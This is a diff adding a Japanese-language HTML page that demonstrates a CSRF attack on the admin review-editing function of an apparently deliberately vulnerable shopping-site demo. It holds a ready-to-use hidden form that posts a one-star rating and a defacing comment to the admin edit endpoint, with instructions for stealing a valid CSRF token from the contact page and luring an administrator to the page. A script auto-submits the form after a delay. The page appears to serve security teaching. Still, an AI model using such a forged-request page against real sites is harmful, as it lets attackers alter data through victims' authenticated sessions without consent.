@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CSRF Attack - Review Edit</title>
+    <meta charset="UTF-8">
+</head>
+<body>
+    <h1>レビュー編集CSRF攻撃デモ</h1>
+    
+    <h2>攻撃概要</h2>
+    <p>この攻撃は、管理者のレビュー編集機能に対するCSRF攻撃です。</p>
+    <p><strong>脆弱性:</strong> 任意のユーザーの有効なCSRFトークンを使用してレビューを編集できます。</p>
+    
+    <h2>攻撃手順</h2>
+    <ol>
+        <li>攻撃者が自分のCSRFトークンを取得</li>
+        <li>そのトークンを使用して管理者に対するCSRF攻撃を実行</li>
+        <li>管理者がこのページを訪問すると、レビューが勝手に編集される</li>
+    </ol>
+    
+    <h2>使用方法</h2>
+    <ol>
+        <li>まず通常ユーザーでログインして contact.html からCSRFトークンを取得</li>
+        <li>下記フォームの csrf_token 値をそのトークンに変更</li>
+        <li>review_id を攻撃対象のレビューIDに変更</li>
+        <li>管理者にこのページを開かせる</li>
+    </ol>
+    
+    <div style="border: 2px solid red; padding: 10px; margin: 10px 0;">
+        <h3>⚠️ 攻撃フォーム（自動実行）</h3>
+        <form id="csrfForm" action="https://vulnerable-shopping-mall21.vercel.app/admin/reviews/edit/32" method="POST" target="_blank">
+            <input type="hidden" name="csrf_token" value="REPLACE_WITH_VALID_TOKEN" />
+            <input type="hidden" name="rating" value="1" />
+            <input type="hidden" name="comment" value="CSRF攻撃により変更されました！管理者の知らない間にレビューが編集されました。" />
+            
+            <p><strong>対象レビューID:</strong> 32</p>
+            <p><strong>変更内容:</strong></p>
+            <ul>
+                <li>評価: 1 (非常に悪い)</li>
+                <li>コメント: "CSRF攻撃により変更されました！"</li>
+            </ul>
+            
+            <button type="submit" style="background-color: red; color: white; padding: 10px;">手動で攻撃実行</button>
+        </form>
+    </div>
+    
+    <h3>CSRFトークン取得方法</h3>
+    <ol>
+        <li><a href="https://vulnerable-shopping-mall21.vercel.app/contact" target="_blank">お問い合わせページ</a>を開く</li>
+        <li>開発者ツールでHTMLを確認</li>
+        <li>&lt;input type="hidden" name="token" value="..."&gt; の値をコピー</li>
+        <li>上記フォームの REPLACE_WITH_VALID_TOKEN を置き換え</li>
+    </ol>
+    
+    <h3>検証方法</h3>
+    <ol>
+        <li>管理者でログイン</li>
+        <li><a href="https://vulnerable-shopping-mall21.vercel.app/admin/reviews" target="_blank">レビュー管理</a>を開く</li>
+        <li>対象レビューが変更されていることを確認</li>
+    </ol>
+    
+    <script>
+        // 5秒後に自動実行（実際の攻撃では即座に実行）
+        setTimeout(function() {
+            if (confirm('CSRF攻撃を実行しますか？\n\n注意: この操作は実際にレビューを変更します。')) {
+                document.getElementById('csrfForm').submit();
+            }
+        }, 5000);
+        
+        // ページ読み込み時にトークン変更を促す
+        window.onload = function() {
+            alert('攻撃を実行する前に、有効なCSRFトークンを設定してください。\n\n1. /contact ページでトークンを取得\n2. フォームのREPLACE_WITH_VALID_TOKENを置き換え');
+        };
+    </script>
+</body>
+</html>
